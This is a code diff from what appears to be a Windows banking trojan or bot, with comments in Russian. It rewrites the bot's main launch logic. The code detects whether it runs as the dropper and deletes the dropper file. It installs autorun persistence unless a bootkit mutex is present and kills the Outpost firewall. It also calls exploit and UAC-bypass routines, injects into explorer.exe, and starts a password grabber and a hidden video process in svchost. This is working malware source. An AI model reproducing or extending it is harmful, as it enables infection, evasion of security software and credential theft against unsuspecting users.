@@ -69,19 +69,19 @@ void WriteLog(const char* Msg)
 //#pragma comment(linker, "/ENTRY:ExplorerMain" )
 
 
+char DropperFileName[MAX_PATH]; // Имя запускаемого файла
 
-WCHAR TempFileName[ MAX_PATH ]; //темп файл для добавления в автозагрузку
-WCHAR FileToDelete[ MAX_PATH ]; //путь для удаления первоначального файла бота
+//WCHAR TempFileName[ MAX_PATH ]; //темп файл для добавления в автозагрузку
+//WCHAR FileToDelete[ MAX_PATH ]; //путь для удаления первоначального файла бота
 
-DWORD dwKillPid		 = 0; //пид для убийства процесса бота
-DWORD dwFirst	     = 0; //запуск в первый раз
+DWORD DropperPid     = 0; // пид процесса бота
+BOOL IsDropper       = 0; // Признак того, что был совершён запуск из дропера
+BOOL FirstRun	     = 0; //Признак того что бот запускается первы раз
 DWORD dwAlreadyRun   = 0; //если уже запущены
 DWORD dwGrabberRun	 = 0; //отработал ли граббер
-DWORD dwExplorerSelf = 0; //если инжект был в собственный эксплорер
+BOOL InjectedInSelfExplorer = 0; //Признак того, что ботом был создан свой экземпляр эксплорера куда он и заинжектился
 //DWORD dwExplorerPid  = 0; //пид эксплорера
 
-
-//получаем пид эксплорера
 
 
 void InternalAddToAutorun()
@@ -89,57 +89,57 @@ void InternalAddToAutorun()
 	// Добавляем программу в автозагрузку
 	// только в случае если в системе не зарегистрирован мьютекс
 	// сигнализирующий об успешной установке буткита
-	#ifndef DEBUGBOT
-		const static char ButkitMutex[] = {'b', 'k', 't', 'r', 'u', 'e',  0};
-		HANDLE Mutex = (HANDLE)pOpenMutexA(SYNCHRONIZE, TRUE, (PCHAR)ButkitMutex);
-		if (Mutex)
-		{
-			pCloseHandle(Mutex);
-			MDBG("Main", "Буткит установлен. Игнорируем добавление в автозагрузку.");
-			return;
-		}
-
-		bool ServiceInstalled = false;
-		if (!WSTR::IsEmpty(TempFileName))
-		{
-				PCHAR Name = WSTR::ToAnsi(TempFileName, 0);
-
-				BOT::Install(Name, false);
-				//BOT::InstallService(Name);
-				//BOT::AddToAutoRun(Name);
-				STR::Free(Name);
-		}
+	#ifdef DEBUGBOT
+		return;
 	#endif
+	
+	const static char ButkitMutex[] = {'b', 'k', 't', 'r', 'u', 'e',  0};
+	HANDLE Mutex = (HANDLE)pOpenMutexA(SYNCHRONIZE, TRUE, (PCHAR)ButkitMutex);
+	if (Mutex)
+	{
+		pCloseHandle(Mutex);
+		MDBG("Main", "Буткит установлен. Игнорируем добавление в автозагрузку.");
+		return;
+	}
+
+	bool ServiceInstalled = false;
+	//if (!WSTR::IsEmpty(TempFileName))
+	if (IsDropper)
+	{
+			BOT::Install(DropperFileName, false);
+	}
 }
 
 
 void DeleteDropper() // убиваем процесс, стираем файл
 {
 	
-	if ( dwKillPid != 0 && !WSTR::IsEmpty(FileToDelete))
+	if (IsDropper)
 	{
 		MDBG("Main", "Удаляем дропер");
-		pWinStationTerminateProcess(NULL, dwKillPid, DBG_TERMINATE_PROCESS );	
-		pSetFileAttributesW( FileToDelete, FILE_ATTRIBUTE_ARCHIVE );
-		pDeleteFileW(FileToDelete);
+		pWinStationTerminateProcess(NULL, DropperPid, DBG_TERMINATE_PROCESS );	
+		pSetFileAttributesA( DropperFileName, FILE_ATTRIBUTE_ARCHIVE );
+		pDeleteFileA(DropperFileName);
 	}
 }
+
+
 
 bool RunLoaderRoutine()
 {
 #ifdef UAC_bypassH
 	if( !RunBotBypassUAC(0) )
-		return MegaJump( LoaderRoutine );
+		return MegaJump( LoaderRoutine ) == TRUE;
 	return true;
 #else
-	return MegaJump( LoaderRoutine );
+	return MegaJump( LoaderRoutine ) == TRUE;
 #endif
 }
 
 bool RunVideoProcess()
 {
 	MDBG( "Main", "Запуск видеодлл в отдельном свцхосте" );
-	return MegaJump( VideoProcess::StartSvchost );
+	return MegaJump( VideoProcess::StartSvchost ) == TRUE;
 }
 
 DWORD WINAPI LoaderRoutine( LPVOID lpData )
@@ -251,7 +251,7 @@ void ExplorerMain()
 	// способам автозапуска.
 	BOT::TryCreateBotInstance();
 
-	if ( !dwExplorerSelf )
+	if (!InjectedInSelfExplorer)
 		UnhookDlls();
 
 	// Отключаем отображение ошибок при крахе процесса
@@ -281,7 +281,7 @@ void ExplorerMain()
 	#endif
 
 	#ifdef GrabberH
-		if ( dwFirst && !dwGrabberRun )
+		if (FirstRun && !dwGrabberRun )
 			MegaJump( GrabberThread ); 
 	#endif
 
@@ -294,7 +294,7 @@ void ExplorerMain()
 
 	// Вызываем событие cтарта експлорера
 
-	if (dwFirst)
+	if (FirstRun)
 		ExplorerFirstStart(NULL);
 
 	ExplorerStart(NULL);
@@ -307,11 +307,13 @@ DWORD WINAPI ExplorerRoutine( LPVOID lpData )
 {
 
 	BOT::InitializeApi();
+
+	MDBG( "Main", "ExplorerRoutine InjectedInSelfExplorer=%d",  InjectedInSelfExplorer);
 	
-	if (dwExplorerSelf) 
+	if (InjectedInSelfExplorer) 
 	{
 		//если инжект был в свой эксплорер завершаемся	
-		dwExplorerSelf = 0;
+		InjectedInSelfExplorer = FALSE;
 		if (!InjectIntoExplorer(ExplorerRoutine))
 		{
 			ExplorerMain();
@@ -399,87 +401,110 @@ int APIENTRY MyMain()
 
 	//UnhookDlls(); //снимаем хуки
 
-	WCHAR ModulePath[MAX_PATH];
+	pGetModuleFileNameA(NULL, DropperFileName, MAX_PATH);
+	DropperPid = (DWORD)pGetCurrentProcessId();
 
-	pGetModuleFileNameW( NULL, ModulePath, MAX_PATH );
-
-	DWORD dwProcessHash = File::GetNameHashW(ModulePath, false);
-	DWORD dwProcessHash2 = File::GetNameHashW(ModulePath, true);
+	DWORD dwProcessHash = File::GetNameHashA(DropperFileName, false);
+	DWORD dwProcessHash2 = File::GetNameHashA(DropperFileName, true);
 	
-	MDBG( "Main", "В процессе %S, %08x", ModulePath, dwProcessHash2 );
+	
+	// Проверяем источник запуска (дроппер либо бот из автозагрузки)
+	IsDropper = dwProcessHash != BOT::GetBotExeNameHash();
 
-	bool inExplorer = dwProcessHash2 == 0x490A0972 ? true : false; //true если запустили в процессе проводника
+	// Если запуск идёт из дропера то считаем, что это первый запуск
+	FirstRun = IsDropper;
 
-	if ( dwProcessHash == BOT::GetBotExeNameHash()) // запуск из самого бота
+	// Проверяем запущены ли мы в процессе проводника
+	bool InExplorer = dwProcessHash2 == 0x490A0972 /* explorer.exe */; 
+
+	// Убиваем оутпост
+	KillOutpost();
+
+	// Устанавливаем эксплоиты
+	BOOL Exploits = SetExploits();
+
+	if (!Exploits)
 	{
-		KillOutpost();
-		DWORD dwExploits = SetExploits();
+		// Если не удалосьустановить эксплоиты то запускаем процесс лоадера вне эксплорер
+		// и, в случае первого  запуска, запускаем грабер паролей
 
-		if ( !dwExploits )
+		if ( RunLoaderRoutine() /*MegaJump( LoaderRoutine )*/ )
+			dwAlreadyRun = 1;
+
+		#ifdef GrabberH
+			if (FirstRun)
+				dwGrabberRun = MegaJump(GrabberThread);
+		#endif 
+	}
+
+
+	if (InExplorer)
+	{
+		MDBG( "Main", "Стартанули в процессе explorer.exe");
+		IsDropper = FALSE;
+		InjectedInSelfExplorer = FALSE;
+		RunThread( ExplorerRoutine, 0 );
+	}
+	else
+	{
+		// Обычный запуск exe бота
+		MDBG( "Main", "В процессе [IsDropper=%d] %s, %08x", IsDropper, DropperFileName, dwProcessHash2 );
+		InjectedInSelfExplorer = TRUE;
+		
+		// Запускаем свой эксплорер и инжектимся в него
+		if (!JmpToExplorer(ExplorerRoutine))
 		{
-			if ( RunLoaderRoutine() /*MegaJump( LoaderRoutine )*/ )
-			{
-				dwAlreadyRun = 1;
-			}
-		}
+			MDBG( "Main", "Ошиька создания эксплорера и инжекта в него");
+			InjectedInSelfExplorer = FALSE;
+			
+			if (IsDropper)
+				InternalAddToAutorun();
 
-		dwExplorerSelf = 1;
-
-		if ( !JmpToExplorer( ExplorerRoutine ) )
-		{
-			dwExplorerSelf = 0;
-
-			if ( !InjectIntoExplorer( ExplorerRoutine ) && !dwAlreadyRun )
+			// Пытаемся заинжектиться в запущенный эксплорер
+			if (!InjectIntoExplorer( ExplorerRoutine ) && !dwAlreadyRun )
 			{
 				RunLoaderRoutine(); //MegaJump( LoaderRoutine );
 			}
+		}
+	}
+
+/*
+	m_wcsncpy(FileToDelete, ModulePath, m_wcslen( ModulePath ) );
+	dwKillPid = (DWORD)pGetCurrentProcessId();
+	CopyFileToTemp( ModulePath, TempFileName );
+
+	if (!IsDropper) 
+	{
+		// запуск из бота в автозагрузке
+
+		if ( !JmpToExplorer( ExplorerRoutine ) )
+		{
+			InjectedInSelfExplorer = FALSE;
+
 		}		
 	}
 	else
 	{
-		dwFirst = 1;
+		// Бот запускается из дропера
 
-		KillOutpost();
+		InjectedInSelfExplorer = TRUE;
 
-		DWORD dwExploits = SetExploits();
-
-		if ( !dwExploits )
+		if(InExplorer)
 		{
-			if ( RunLoaderRoutine() /*MegaJump(LoaderRoutine)*/)
-			{
-				dwAlreadyRun = 1;
-			}
-
-			#ifdef GrabberH
-				if ( MegaJump( GrabberThread ) )
-					dwGrabberRun = 1;
-			#endif 
-		}
-
-		dwExplorerSelf = 1;
-		if( inExplorer )
-		{
-			MDBG( "Main", "Стартанули в процессе explorer.exe" );
-			FileToDelete[0] = 0; //если в процессе проводника, то самоудаление не нужно
-			TempFileName[0] = 0;
-			dwExplorerSelf = 0;
-			RunThread( ExplorerRoutine, 0 );
 		}
 		else
 		{
-			m_wcsncpy(FileToDelete, ModulePath, m_wcslen( ModulePath ) );
-			dwKillPid = (DWORD)pGetCurrentProcessId();
-			CopyFileToTemp( ModulePath, TempFileName );	
+
 			if (!JmpToExplorer(ExplorerRoutine ) )
 			{
-				dwExplorerSelf = 0;
-
-				InternalAddToAutorun();
+				InjectedInSelfExplorer = 0;
+	
 			}
 		}
 	}
+*/
 
-	if( !inExplorer) 
+	if(!InExplorer) 
 		pExitProcess(1);
 	return 1;
 }
